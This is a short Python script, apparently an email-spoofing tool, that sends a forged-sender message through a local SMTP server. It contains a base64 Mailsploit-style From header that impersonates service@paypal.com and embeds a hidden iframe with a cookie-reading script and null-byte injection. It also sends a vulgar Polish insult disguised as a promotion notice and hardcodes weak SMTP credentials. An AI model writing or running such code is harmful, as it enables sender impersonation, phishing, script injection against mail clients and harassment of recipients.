import smtplib
from lazyme.string import color_print

spoofed_display_name = "Name Surname"

spoofed_from = "=?utf-8?b?c2VydmljZUBwYXlwYWwuY29tPGlmcmFtZSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9aHR0cHM6Ly93d3cuaHVzaG1haWwuY29tIHN0eWxlPSJkaXNwbGF5Om5vbmUi?==?utf-8?Q?=0A=00?=@mailsploit.com"
spoofed_from = "email@gmail.com"

email_to = 'email@gmail.com'

msg = """From: \"%s\" <%s>
To: %s
Subject: DOSTAJESZ AWANS\n
JEBANY AWANS SKURWYSYNU\n\n\nSignature\n(more of the signature)
""" % (spoofed_display_name, spoofed_from, email_to)

SMTP_user = 'user@localhost'
SMTP_password = 'user'
server = None
try:
    server = smtplib.SMTP('localhost', 25)
    server.ehlo()   # optional
except:
    color_print('Can\'t connect to SMTP', color='blue')
server.set_debuglevel(1)

try:
    server.login(SMTP_user, SMTP_password)
except:
    color_print('Can\'t authenticate with the server', color='blue')

try:
    server.sendmail(spoofed_from, [email_to], msg)
except:
    color_print('Can\'t send an email', color='blue')

server.quit()